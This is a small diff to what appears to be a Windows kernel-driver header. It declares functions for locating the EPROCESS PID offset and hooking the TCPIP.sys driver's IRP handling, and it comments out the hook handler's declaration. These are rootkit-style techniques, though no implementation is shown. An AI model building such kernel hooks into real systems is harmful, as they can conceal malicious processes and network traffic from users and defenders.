@@ -48,8 +48,10 @@ ULONG find_eprocess_pid_offset();
 // Hook the TCPIP.sys driver
 NTSTATUS TCPHook();
 
+
 // Hook handler for hooked TCP/IP driver
-NTSTATUS TCPIRPHookHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
+//NTSTATUS TCPIRPHookHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
+
 
 // Completion routine
 NTSTATUS HookCompletionRoutine(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp, _In_ PVOID Context);
